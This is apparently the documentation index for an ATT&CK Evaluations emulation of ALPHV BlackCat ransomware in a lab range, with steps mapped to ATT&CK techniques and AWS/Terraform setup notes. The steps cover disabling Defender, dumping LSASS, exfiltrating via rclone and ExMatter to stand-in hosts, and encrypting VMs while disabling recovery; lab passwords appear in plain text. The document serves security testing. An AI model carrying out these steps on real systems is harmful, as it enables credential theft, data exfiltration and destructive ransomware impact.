threat protection\" settings","Open PowerShell and use the Set-MpPreference module to disable Defender's Real-time protection"]},{"i":"procedures","l":"â£ï¸ Procedures","p":[".\\windesk","Close all Windows then disconnect from the RDP session to datamon (10.20.10.122). You should be returned to the RDP session to the bastion host.","DIGIREVENGE\\zorimoto","Execute InfoStealer against the bastion host and confirm output contains plaintext credentials for the SQL service account","Execute InfoStealer against the NetBNMBackup SQL server datamon (10.20.10.122) using zorimoto's credentials and confirm output contains plaintext credentials for:","In the \"Connect to Server\" prompt, select Sql Server Authentication for the Authentication type, if not already selected","Login as zorimoto (no DIGIREVENGE):","Next expand NetBNMBackup> Tables and right-click dbo.Credentials, then select Select Top 1000 Rows.","On the lefthand side, in the Object Explorer expand the Databases folder.","Open a non-elevated cmd.exe as zorimoto then execute BITSAdmin.exe to download InfoStealer from the adversary server","Open an elevated PowerShell prompt, providing the workstation local administrator account credentials windesk when prompted, and disable Defender's Real-time protection via Set-MpPreference","Password","Review the rows of data to ensure they are indicative of being an unencrypted, encoded-only NetBNMBackup duplicate.","The domain adminstrator account ykaida.da","The Linux KVM server administrator account marakawa","The workstation local administrator account windesk","tzTVgs44isT4YxWU!","Username","windesk","Within Task Manager, navigate to the \"Details\" tab and, using the provided list of processes, end any matching process names","Within Task Manager, navigate to the \"Services\" tab and, using the provided list of services, end any matching service names","Within the RDP session, search for \"Remote Desktop Connection\" and initiate an RDP connection to datamon (10.20.10.122) using zorimoto's credentials:","Within the RDP session, search for \"SQL Server Management Studio\".","Within the RDP session, search for \"Virus & threat protection\". Select\"Manage settings\" then toggle Real-time protection to Off. Provide the workstation local administrator account credentials if prompted.","Within the RDP session, search for Task Manager, right-click and Run as Administrator, providing the workstation local administrator account credentials when prompted."]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","Authenticate with workstation local administrator account credentials","Create BITSAdmin download job from adversary server","cred_query","Disable Defender Real-time protection","Download InfoStealer via BITSAdmin.exe","Execute Set-MpPreference to disable Real-time protection","HC3 Cisco Mandiant Symantec AT&T BlackBerry Logpoint","HC3 Microsoft Cisco Mandiant","https://blog.checkymander.com/red%20team/veeam/decrypt-veeam-passwords/","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps","https://www.mandiant.com/resources/blog/alphv-ransomware-backup","https://www.varonis.com/blog/blackcat-ransomware","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","InfoStealer pulls passwords from local database","InfoStealer pulls passwords from NetBNMBackup","Mandiant","Open cmd","Open PowerShell","Red Team Activity","Relevant CTI Report","Source Code Link","Symantec","T1059.001 Command and Scripting Interpreter: PowerShell","T1059.003 Command and Scripting Interpreter: Windows Command Shell","T1078.003 Valid Accounts: Local Accounts","T1105 Ingress Tool Transfer","T1197 BITS Jobs","T1555 Credentials from Password Stores","T1562.001 Impair Defenses: Disable or Modify Tools","Terminate processes and services related to AV","Trend Micro"]},{"i":"step-3---credential-access-for-privilege-escalation","l":"Step 3 - Credential Access for Privilege Escalation"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Using the plaintext credentials retrieved for the workstation local administrator account windesk, the BlackCat affiliate uses the RDP session to the bastion host kimeramon (10.20.20.11) to edit the registry and enable WDigest.","The BlackCat affiliate then dumps credentials via Task Manager and exfiltrates the dump file using rclone."]},{"i":"procedures","l":"â£ï¸ Procedures","p":[".\\windesk","â¡ï¸ Switch to your Kali RDP session and check for the exfiltrated lsass.DMP file","Change directory to the directory containing the rclone executable:","Ensure the output configuration confirmation looks like the below","For editing the advanced config, press Enter for \"no\"","For keeping the \"webdav\" remote, type y for \"Yes this is OK\" and press Enter","For name of the WebDAV site, type 6 for \"Other site/service or software\" then press enter","For the name of the remote, type webdav then press Enter","For the password, press Enter to leave blank","For the token, press Enter to leave blank","For the type of storage to configure, type 49 for \"WebDAV\" then press Enter","For the URL of the host to connect to, type http://luffaplex-dillpickle-inator.com:8080 then press Enter","For the user, press Enter to leave blank","Go to the Downloads folder, right-click the rclone zip, click\"Extract all...\" from the menu, and in the window that opens, click the Extract button","On entry to the rclone config console, type n for \"New remote\" then press Enter","Password","Search for cmd.exe and right-click to Run As Administrator, providing the workstation local administrator account credentials when prompted","Username","Using Registry Editor, enable WDigest by browsing to HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest, right-click inside the window, New > DWORD (32-bit) Value, and type UseLogonCredential for the registry key value name. Ensure the type says REG_DWORD. Then right- click the registry key value > Modify... then change the \"Value data:\" field to 1.","Using Task Manager, go to Details, find lsass.exe then right-click and click\"Create Dump File\". In the pop up window, take note of the file location where the DMP file has been created ( C:\\Users\\windesk\\AppData\\Local\\Temp\\lsass.DMP)","Using the cmd.exe terminal, configure rclone for exfil via WebDAV","Using the cmd.exe terminal, exfiltrate the DMP file using rclone","windesk","Within the RDP session to the bastion host kimeramon (10.20.20.11), open Edge and browse to the following link to initiate the download of rclone:","Within the RDP session, search for Registry Editor and right-click to Run As Administrator, providing the workstation local administrator account credentials when prompted","Within the RDP session, search for Task Manager and right-click to Run As Administrator (if not already open), providing the workstation local administrator account credentials when prompted","You should now see webdav in the table of Current remotes. Type q to exit the rclone config console."]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","Authenticate with workstation local administrator account credentials","Download rclone from GitHub","Dump LSASS via Task Manager","Exfiltrate lsass.DMP over WebDAV (HTTP) using rclone","HC3 Logpoint Microsoft Cisco Mandiant Sophos Sophos","HC3 Microsoft Cisco Mandiant","https://duo.com/decipher/prolific-affiliate-threat-groups-linked-to-blackcat-ransomware","https://www.mandiant.com/resources/blog/alphv-ransomware-backup","https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","Logpoint Microsoft","Mandiant","Modify WDigest via Registry Editor","Open cmd","Red Team Activity","Relevant CTI Report","Source Code Link","T1003.001 OS Credential Dumping: LSASS Memory","T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol","T1059.003 Command and Scripting Interpreter: Windows Command Shell","T1078.003 Valid Accounts: Local Accounts","T1105 Ingress Tool Transfer","T1112 Modify Registry","Trend Micro"]},{"i":"step-4---collection--exfiltration","l":"Step 4 - Collection & Exfiltration"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["The BlackCat affiliate downloads ExMatter and a network scanning script to identify additional targets via PowerShell using the compromised Domain Admin account digirevenge\\ykaida.da. Then, the BlackCat affiliate uses PsExec to execute ExMatter against the identified targets.","On execution, ExMatter will:","Retrieve the drive names of all logical drives and collect all file path names","Use LastWriteTime to create a queue of files for exfiltration ( ExMatter will only exfiltrate files larger than 1,024 bytes)","Upload files from the queue to a remote SFTP server using the parameters:","Host: hide-the-secret-password-inator.net","Port: 22","Compresses target files into a zip archive","Removes traces of itself by invoking PowerShell to overwrite the first 65,536 bytes then deleting itself","After remote execution of ExMatter has completed, the BlackCat affiliate executes ExMatter on the local workstation."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Open cmd.exe(or use an existing cmd.exe running as zorimoto) and execute BITSAdmin.exe to download ExMatter from the adversary server","Search for PowerShell and right-click to Run As Administrator, providing the Domain Admin credentials for ykaida.da when prompted","Username","Password","digirevenge\\ykaida.da","FWy9aXyXbYrbxFcE!","Using the elevated PowerShell, download and execute the network scanning script to identify additional targets","Using the elevated PowerShell, execute ExMatter via PsExec against the additional targets","This may take some time, since ExMatter will run on each host one at a time.","Using File Explorer, browse to C:\\Users\\zorimoto\\AppData\\Local\\Temp and then right-click collector1.exe and Run As Administrator to run ExMatter locally, providing the Domain Admin credentials for ykaida.da when prompted:","\uD83D\uDCA1 For this execution of ExMatter, ExMatter's log file will be located in C:\\Users\\zorimoto\\AppData\\Local\\Temp\\EMlog.txt","Go to Verifying ExMatter Execution and follow the steps to check that ExMatter executed successfully on the both the remote target hosts and local target host."]},{"l":"Verifying ExMatter Execution","p":["â If there are zip archives missing for a given host perform the remaining instructions to fetch ExMatter log files for the host(s).","â¡ï¸ Return to your Kali server and open up a terminal window","â¡ï¸ return to your RDP session to the jumpbox homelander (116.83.1.29)","â¡ï¸ Switch back to your kali terminal and execute the following to unzip and decrypt the uploaded log files:","alphamon","axi9eengei9inaeR@","bakemon","blacknoirmon","butchermon","datamon","digirevenge\\evals_domain_admin","Ensure that for each of the following hostnames, there is a non-empty folder whose name begins with that hostname and has non-empty zip files:","For each of the hosts that were missing zip uploads, check the corresponding decrypted log file to look for errors or signs of unsuccessful/incomplete execution:","For hosts that had failed uploads but no matches from the grep command, you may need to actually go through the log files to look for signs of failure.","From the jumpbox, RDP into the subsidiary B domain controller blacknoirmon (10.20.10.4) as evals_domain_admin:","If checking the original scenario steps:","If there are successful uploads for all hosts, proceed with the remainder of the scenario.","kimeramon","Open up an administrator powershell terminal and execute the following:","Password","Run the following command to check for uploaded zip archives:","Sign out of your RDP session","stormfrontmon","Username","When prompted, enter the credentials to Kali for SCP"]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","Authenticate with Domain Admin account credentials","Create BITSAdmin download job from adversary SMB share","Destroy","Download Empire port scanner","Download ExMatter via BITSAdmin.exe","Execute ExMatter using PsExec","ExMatter compresses files in a zip archive","ExMatter deletes itself","ExMatter enumerates file paths","ExMatter exfiltrates files to SFTP server","ExMatter overwrites itself","ExMatter retrieves the drive names of all logical drives","FindTargetFiles","GetDriveInfos","HC3 Microsoft Cisco Mandiant","HC3 Microsoft Mandiant Sophos Sophos netskope","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps","https://www.cyderes.com/blog/threat-advisory-exmatter-data-extortion/","https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool","https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","Kroll","Mandiant","Microsoft","Open cmd","Open PowerShell","Picus","Red Team Activity","Relevant CTI Report","Scan ports via Empire","Source Code Link","Symantec Kroll","Symantec Symantec","T1046 Network Service Discovery","T1048.002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol","T1059.001 Command and Scripting Interpreter: PowerShell","T1059.003 Command and Scripting Interpreter: Windows Command Shell","T1070.004 Indicator Removal: File Deletion","T1078.002 Valid Accounts: Domain Accounts","T1083 File and Directory Discovery","T1105 Ingress Tool Transfer","T1197 BITS Jobs","T1485 Data Destruction","T1560.002 Archive Collected Data: Archive via Library","T1569.002 System Services: Service Execution","UploadFile","ZipFiles"]},{"i":"step-5---payload-deployment","l":"Step 5 - Payload Deployment"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["The BlackCat affliate downloads BlackCat (Linux) to the bastion host kimeramon (10.20.20.11) and uses SCP to copy BlackCat (Linux) to the Linux KVM server leomon (10.20.10.16), providing the Linux KVM server administrator credentials marakawa retrieved from InfoStealer. Next, the BlackCat affiliate sends an SSH command to the Linux KVM server to execute BlackCat (Linux) on the Linux KVM server.","BlackCat (Linux) will:","Discover system UUID, current username, and current hostname","Verify that the target machine is a KVM server","Enumerate and stop running virtual machines","Enumerate and delete virtual machine snapshots","Terminate a pre-defined set of processes and services that may interfere with encryption","Enumerate and encrypt virtual machine volumes using AES","Encrypted files are appended with .skyfl2e at the end the filename. Ex.\"[original filename].[extension].skyfl2e\"","Place a ransom note in folder(s) containing the encrypted VM volumes"]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â© Emulate the following legitimate user activity:","â© Resume red team activity:","â¡ï¸ initiate an RDP session to the jumpbox homelander (116.83.1.29)(if not already open)","â¡ï¸ switch back to your RDP session to the bastion host kimeramon (10.20.20.11)","check VM state again","create additional snapshot for each VM","cuL9LmnrdnWqbqcA@","enumerate snapshots again","list all VMs regardless of running state","list current snapshots for each VM","marakawa","Open cmd.exe(or use an existing cmd.exe running as zorimoto) and execute BITSAdmin.exe to download BlackCat (Linux) to the bastion host kimeramon (10.20.20.11) from the adversary server","Open PowerShell (non-elevated) and SCP BlackCat to the Linux KVM server leomon (10.20.10.16), typing yes to continue connecting, providing the Linux KVM server administrator credentials marakawa when prompted","Open up powershell and SSH to the KVM server, typing yes to continue connecting as the KVM admin:","Password","start VMs","terminate SSH session","Username","Using PowerShell, execute BlackCat via SSH command to the Linux KVM server, providing the Linux KVM server administrator credentials when prompted"]},{"i":"verifying-blackcat-linux-logs","l":"Verifying BlackCat (Linux) Logs","p":["â¡ï¸ Return to your Kali server and open up a terminal window","Execute the following to copy the BlackCat Linux logs from the KVM server as evals_domain_admin, typing yes to continue the connection:","Password","axi9eengei9inaeR@","Execute the following in the kali terminal to decrypt and inspect the logs:","Ensure that the logs show evidence of successful encryption activity and VM tampering."]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","Authenticate with Linux KVM server administrator account credentials","BlackCat (Linux) deletes snapshots","BlackCat (Linux) encrypts VM volumes","BlackCat (Linux) enumerates snapshots","BlackCat (Linux) enumerates VM volumes","BlackCat (Linux) enumerates VMs","BlackCat (Linux) leaves ransom notes","BlackCat (Linux) stops VMs","BlackCat (Linux) terminates processes","BlackCat (Linux) terminates services","Create BITSAdmin download job from adversary SMB share","delete_snapshot","Download BlackCat (Linux) via BITSAdmin.exe","drop_ransom_note","encrypt_volumes","Execute BlackCat (Linux) on Linux server","Execute chmod to make BlackCat (Linux) executable","get_vm_snapshots","get_vms","get_volume_paths","HC3 Microsoft Cisco Mandiant","https://assets.sophos.com/X24WTUEQ/at/q6r6n3x43mnrfchn5tfh3qmw/sophos-x-ops-active-adversary-multiple-attackers-wp.pdf","https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/","https://cybersecurity.att.com/blogs/labs-research/blackcat-ransomware","https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/","https://unit42.paloaltonetworks.com/blackcat-ransomware/#Technical-Details","https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware","https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf","https://www.mandiant.com/resources/blog/alphv-ransomware-backup","https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/'https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware","https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack","https://www.varonis.com/blog/blackcat-ransomware","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","killall_by_name","Mandiant","Microsoft","Open cmd","Open PowerShell","Red Team Activity","Relevant CTI Report","shutdown_vm","Source Code Link","T1021.004 Remote Services: SSH","T1057 Process Discovery","T1059.001 Command and Scripting Interpreter: PowerShell","T1059.003 Command and Scripting Interpreter: Windows Command Shell","T1083 File and Directory Discovery","T1105 Ingress Tool Transfer","T1197 BITS Jobs","T1222 File and Directory Permissions Modification","T1486 Data Encrypted for Impact","T1489 Service Stop","T1490 Inhibit System Recovery","T1491.001 Defacement: Internal Defacement","T1570 Lateral Tool Transfer","terminate_services","Transfer BlackCat (Linux) to Linux server","Valid Accounts: Domain Accounts","Varonis"]},{"i":"step-6---encryption-for-impactinhibit-system-discovery","l":"Step 6 - Encryption for Impact/Inhibit System Discovery"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["After encryption, BlackCat will:","BlackCat (Windows) will:","BlackCat excludes some directories, filenames, and file extensions from encryption","BlackCat will drop ransom notes in directories containing encrypted files","Change wallpaper for logged-in users to image of ransom note","Delete volume shadow copies again","Delete volume shadow copies via API calls","Disable bootloader recovery using bcdedit /set {default} recoveryenabled No","Empty the recycling bin","Enable remote-to-local and remote-to-remote symbolic link evaluation via fsutil","Encrypt files using AES","Encrypted files are appended with .skyfl2e at the end the filename. Ex.\"[original filename].[extension].skyfl2e\"","Enumerate all local disk partitions and mount any hidden partitions for later encryption","Get current username and current hostname","List and clear Windows Event logs via API calls","Modify the registry to increase the maximum limit of concurrent network requests machines can make (for PsExec propagation and accessing remote files):","Performs NetBIOS scans on the local network to determine valid Windows hosts to propagate to","Propagate via a PsExec module embedded in BlackCat code and compressed with zlib","reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f","Run command to collect Universally Unique Identifiers (UUIDs) via WMIC.exe","Terminate a pre-defined set of processes and services that may interfere with encryption","The BlackCat affliate downloads BlackCat (Windows) to the bastion host kimeramon (10.20.20.11) and provides the Domain Admin credentials ykaida.da to run the executable with administrative privileges.","Unmount previously mounted partitions"]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Open cmd.exe(or use an existing cmd.exe running as zorimoto) and execute BITSAdmin.exe to download BlackCat (Windows) to the bastion host kimeramon (10.20.20.11) from the adversary server","Search for cmd.exe then right-click and Run As Administrator to open a new Command Prompt, providing the Domain Admin B credentials ykaida.da when prompted:","Username","Password","ykaida.da","FWy9aXyXbYrbxFcE!","Using the new cmd.exe with ykaida.da privileges, execute BlackCat (Windows)"]},{"i":"verifying-blackcat-windows-logs","l":"Verifying BlackCat (Windows) Logs","p":["â¡ï¸ Return to your RDP session to the Windows jumpbox homelander (116.83.1.29)","â¡ï¸ From the Windows jumpbox, initiate an RDP session to blacknoirmon (10.20.10.4) Subsidiary B Domain Controller as digirevenge\\evals_domain_admin:","Username","Password","digirevenge\\evals_domain_admin","axi9eengei9inaeR@","Open an admin PowerShell prompt and execute the following to fetch the BlackCat logs from affected Subsidiary B hosts, zip them up into a single archive, and SCP the archive to the Kali server:","If prompted, type yes to continue the connection for SCP","â¡ï¸ Switch to your kali server and open up a terminal window","Execute the following in the kali terminal to decrypt and inspect the logs:","Look through each of the decrypted log files (starting with dec_*) and make sure all required activity was exected and that nothing was skipped or errored out."]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","Authenticate with Domain Admin account credentials","BlackCat (Windows) changes the wallpaper","BlackCat (Windows) collects host UUID","BlackCat (Windows) contains embedded PsExec","BlackCat (Windows) deletes volume shadow copies","BlackCat (Windows) deletes volume shadow copies again","BlackCat (Windows) discovers current hostname","BlackCat (Windows) discovers current username","BlackCat (Windows) empties the recycling bin","BlackCat (Windows) encrypts files using AES","BlackCat (Windows) enumerates local disk partitions","BlackCat (Windows) executes PsExec to propagate","BlackCat (Windows) is executed using PsExec","BlackCat (Windows) leaves ransom notes","BlackCat (Windows) lists and clears logs","BlackCat (Windows) modifies bootloader","BlackCat (Windows) modifies the registry","BlackCat (Windows) mounts hidden partitions","BlackCat (Windows) performs NetBIOS scans","BlackCat (Windows) terminates processes","BlackCat (Windows) terminates services","clear_event_logs","Create BITSAdmin download job from adversary SMB share","delete_shadow_copies","disable_bootloader_recovery","Download BlackCat (Windows) via BITSAdmin.exe","drop_ransom_note","empty_recycling_bin","encrypt","find_local_targets","get_hostname","get_username","get_uuid","HC3 Microsoft Cisco Mandiant","https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/BlackcatthreatId=-2147158032","https://www.varonis.com/blog/blackcat-ransomware","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","killall_by_name","Mandiant","Microsoft","mount_hidden_partitions","Open cmd","propagate_via_psexec","PsExec is compressed with zlib","Red Team Activity","Relevant CTI Report","set_wallpaper","setup_psexec","Source Code Link","Symantec","T1018 Remote System Discovery","T1027 Obfuscated Files or Information","T1027.009 Obfuscated Files or Information: Embedded Payloads","T1033 System Owner/User Discovery","T1059.003 Command and Scripting Interpreter: Windows Command Shell","T1070.001 Indicator Removal: Clear Windows Event Logs","T1078.002 Valid Accounts: Domain Accounts","T1082 System Information Discovery","T1083 File and Directory Discovery","T1105 Ingress Tool Transfer","T1112 Modify Registry","T1197 BITS Jobs","T1485 Data Destruction","T1486 Data Encrypted for Impact","T1489 Service Stop","T1490 Inhibit System Recovery","T1491.001 Defacement: Internal Defacement","T1569.002 System Services: Service Execution","T1570 Lateral Tool Transfer","terminate_services","update_maxmpxct_settings","Varonis"]}],[{"l":"Resources","p":["The Resources directory contains the following:","Source code used for the components of the emulated attack","Documentation on building source code and details on usage","Backend components such as the control server","Terraform and Ansible code for the environment setup","Each component has one or more additional documents specific to that resource."]},{"l":"Resources Index","p":["blackcat","README","control_server","DebuggingGuide","ExMatter","infostealer","log_decryptor","payloads","Infrastructure Setup","GettingStarted","InfrastructureOverview","TrafficRedirection"]}],[{"l":"ALPHV BlackCat and menuPass Setup Information"},{"l":"Infrastructure Configuration","p":["For guidance on setting up the overall infrastructure used for emulation of ALPHV BlackCat and menuPass, please see Getting Started. This includes both the victim hosts as well as the attacker platform configuration.","NOTE: Access to an AWS account with permissions to create required resources, a basic understanding of Terraform, Ansible, AWS, and AWS billing are considered prerequisites to deploy the infrastructure configuration."]},{"l":"Infrastructure Overview","p":["For an overview of the infrastructure used, including network layout, lists of hosts, and other details used to emulate the ALPHV BlackCat and menuPass adversaries, check out Infrastructure Overview."]},{"l":"Traffic Redirection Overview","p":["For an overview of traffic redirection used for obfuscation during emulation of ALPHV BlackCat and menuPass adversaries, please see the Traffic Redirection."]}],[{"l":"File Generator","p":["File generator used to populate a target machine with representative files. Uses templates (supplied in the templates folder), currently covering the following file types:","Files are populated in the Documents and Desktop directories for each sub-directory in the initial target directory. Running the program requires root/administrator access to avoid issues with file distribution. Default file names are random per run and per folder. If a seed value is provided, the folders will receive the same file names in every folder receiving a distribution. This can be used to ensure exact scenario recreation on subsequent runs."]},{"l":"User Options"},{"l":"Usage Examples","p":["Example (executable co-located with templates, seed value of \"EVALS\", no prompts on folder creation):",".\\generate-files.exe -d c:\\test -c 50 --seed EVALS --noprompt","Example (Python file located away from templates, prompt prior to folder creation):","python3 .\\generate-files.py -d c:\\test -t c:\\users\\public\\templates -c 150"]},{"l":"Creating a New Executable","p":["While an executable has been supplied alongside the Python file, if you choose to make changes to the Python file (such as changing the file names or additional user folders to populate) and wish to re-compile it, install PyInstaller with pip:","pip install pyinstaller","You may need to add the installation directory to your PATH environment variable. In PowerShell:","PS $env:Path += ;path to pyinstaller provided via pip","Finally, compile the program with the --console flag to ensure output from the program.","pyinstaller --onefile --console .\\generate-files.py"]},{"l":"User Tracking Information","p":["Generated files currently will have one of the following names, followed by an underscore and a random 6-character Alpha string.","The program will provide console output regarding where, and how many, files were written.","Example output:"]}],[{"l":"vpn-client","p":["This Terraform module installs a client vpn. The following resources will be created:","VPN Endpoint - Provides an AWS Client VPN endpoint for OpenVPN clients.","Provides network associations for AWS Client VPN endpoints","Generate AWS Certificate Manager(ACM) certificates"]},{"l":"Inputs","p":["(Optional) The ARN of the IAM SAML identity provider if type is federated-authentication.","[]","{}","365","ACME, Inc","allowed_access_groups","allowed_cidr_ranges","any","authentication_saml_provider_arn","authentication_type","bool","certificate-authentication","cidr","Default","Description","dns_servers","enable_self_service_portal","Extra tags to attach to resources","false","List of Access group IDs to allow access. Leave empty to allow all groups","List of CIDR ranges from which access is allowed","List of DNS Servers","list(string)","logs_retention","map(string)","n/a","Name","Name of organization to use in private certificate","Name prefix for the resources of this stack","Network CIDR to use for clients","no","null","number","Optional security group id to use instead of the default created","organization_name","Required","Retention in days for CloudWatch Log Group","security_group_id","Specify whether to enable the self-service portal for the Client VPN endpoint","split_tunnel","string","Subnet ID to associate clients (each subnet passed will create an VPN association - costs involved)","subnet_ids","tags","The type of client authentication to be used. Specify certificate-authentication to use certificate-based authentication, directory-service-authentication to use Active Directory authentication, or federated-authentication to use Federated Authentication via SAML 2.0.","true","Type","VPC Id to create resources","vpc_id","With split_tunnel false, all client traffic will go through the VPN.","yes"]},{"l":"Outputs","p":["Name","Description","security_group_id","n/a","vpn_ca_cert","vpn_ca_key","vpn_client_cert","vpn_client_key","vpn_endpoint_id","vpn_server_cert","vpn_server_key"]}],[{"l":"MSR2 Infrastructure Project"},{"l":"Managed Services Evaluation Round 2"},{"l":"Requirements","p":["Name","Version","terraform",">=1.1.0","aws","~> 5.29.0"]},{"l":"Providers","p":["Name","Version","aws","5.29.0"]},{"l":"Modules","p":["../../modules/aws/base-vm","../../modules/aws/base-vm-win","../../modules/aws/defaults","../../modules/aws/vpn-client","a-ad-srv1","a-desk1","a-desk2","a-desk3","a-ex-srv1","a-iis-srv1","b-ad-srv1","b-desk1","b-desk2","b-desk3","b-ex-srv1","b-file-srv1","b-kvm-srv1","b-sql-srv1","c-desk1","defaults","n/a","Name","openvpn-client","red-kali1","Source","support-dns-srv1","support-jumpbox-srv1","support-pf-srv1","support-redirect-srv1","support-redirect-srv2","support-redirect-srv3","Version"]},{"l":"Resources","p":["aws_default_route_table.alpha-rtb","aws_default_route_table.beta-rtb","aws_dynamodb_table.dynamodb-terraform-state-lock","aws_eip.alpha-nat-eip","aws_eip.beta-nat-eip","aws_internet_gateway.alpha-igw","aws_internet_gateway.beta-igw","aws_key_pair.ssh-key-pair","aws_nat_gateway.alpha-nat-gw","aws_nat_gateway.beta-nat-gw","aws_route_table_association.rtba_a_desk","aws_route_table_association.rtba_a_nat","aws_route_table_association.rtba_a_srv","aws_route_table_association.rtba_a_vpn","aws_route_table_association.rtba_b_combined","aws_route_table_association.rtba_c_desk","aws_route_table_association.rtba_red","aws_route_table_association.rtba_redirect_a","aws_route_table_association.rtba_redirect_b","aws_route_table_association.rtba_support_nat","aws_route_table.alpha-public-rtb","aws_route_table.beta-public-rtb","aws_s3_bucket.vendors","aws_s3_object.msr2","aws_security_group.alpha","aws_security_group.beta","aws_subnet.a_desk","aws_subnet.a_srv","aws_subnet.a_vpn","aws_subnet.alpha_nat","aws_subnet.b_combined","aws_subnet.beta_nat","aws_subnet.c_desk","aws_subnet.support_a","aws_subnet.support_b","aws_subnet.support_red","aws_vpc_ipv4_cidr_block_association.alpha-a","aws_vpc_ipv4_cidr_block_association.alpha-b","aws_vpc_ipv4_cidr_block_association.alpha-c","aws_vpc_ipv4_cidr_block_association.alpha-nat","aws_vpc_ipv4_cidr_block_association.beta-nat","aws_vpc_ipv4_cidr_block_association.redirect-a-cidr","aws_vpc_ipv4_cidr_block_association.redirect-b-cidr","aws_vpc_peering_connection.range-to-red-pcx","aws_vpc_security_group_ingress_rule.main","aws_vpc.alpha","aws_vpc.beta","data source","Name","resource","Type"]},{"l":"Inputs","p":["(Optional) Category of resource group, (similar to name, used for ansible automation)","(Optional) Environment tag of resource group","AWS availability zone to use, defaults to us-east-1a","AWS region to use, defaults to us-east-1","aws-bucket-name","aws-region","aws-region-az","category","Default","Description","Description for the resource group","dev_linux_password","dev_linux_username","dev_win_admin_password","dev_win_admin_username","devadmin","Development","Domain name for A","Domain name for AD","Domain name for B","Domain name for C","environment","Local admin password to workstation 1","local_domain_admin_password","local_domain_admin_username","localadmin","localAdmin1","MSR2","msr2-vendor-resources","n/a","Name","Name of S3 bucket for managing Terraform state across vendor ranges","name-prefix","Netbios name for A","Netbios name for AD, e.g. reddev","Netbios name for B","Netbios name for C","no","Password for dev Linux hosts","Password for Windows 10 desktop dev boxes","Path to SSH private key to use for Linux ssh systems (public and private key must be matching pair)","Path to SSH public key to use for Linux ssh systems (public and private key must be matching pair)","Required","shutdown_ok","ssh_private_key_path","ssh_public_key_path","string","String prefix for resource names","Type","us-east-1","us-east-1a","Username for Linux hosts","Username for Windows 10 desktop dev boxes","vendor-schedule","Whether the resource can be safely disabled or shutdown","win_a_domain_name","win_a_netbios_name","win_b_domain_name","win_b_netbios_name","win_c_domain_name","win_c_netbios_name","win_desk_password","win_desk_username","win_domain_name","win_netbios_name","win_srv_admin_password","win_srv_admin_username","windesk","winDesk1","Windows Server admin password","Windows Server admin username","yes"]},{"l":"Outputs","p":["Name","Description","cacert","output cert and key separately to simplify redirecting to file used to generate vpn profiles","cakey","n/a","endpointid","rdp_data","vpn","windows-credentials"]}],[{"l":"Getting Started","p":["This document covers the infrastructure setup for emulating ATT&CK Evaluations- ALPHV BlackCat and menuPass (2024).","Overview","AWS Cost Estimate","WARNING - $$$","KVM Server Cost","Prerequisites","Deploy Infrastructure with Terraform","Amazon Marketplace Subscriptions","Windows 11","Deploy environment","Configure Infrastructure with Ansible","Deploy Attack Platform Software"]},{"l":"Overview","p":["ATT&CK Evaluations used the Amazon Web Services (AWS) cloud platform."]},{"l":"AWS Cost Estimate","p":["Specific costs for the AWS resources used will depend on your specific AWS account agreements, region, savings plans, reservations, how frequently the systems are online, and other cost reduction techniques you use. A rough estimated cost for the environment is approximately $6000 - $10000 per month, assuming the hosts are run 24/7. Note that the leomon host, which uses the m5.metal instance type, accounts for 50%+ of the overall cost. Instances should be shutdown and stopped when not in use to further reduce cost."]},{"i":"warning---","l":"WARNING - $$$"},{"l":"KVM Server Cost","p":["WARNING: As mentioned above, the most expensive component is the Kernel Virtual Machine (KVM) Linux server, leomon, used to run virtual machines. The KVM server uses the AWS instance type m5.metal, which alone costs $4.608 per hour (at the time of the evaluation), and accounts for ~ 50% of cost. To reduce cost, you can keep the KVM server off until used, or skip provisioning the KVM host."]},{"l":"Prerequisites","p":["It is assumed you have a working knowledge of the following concepts and access to related tools:","Existing AWS Account with permissions to perform required actions (create/manage resources including EC2 instances, VPCs, Internet Gateways, Security Groups, and related resources)","Tools","ssh-keygen,","bash 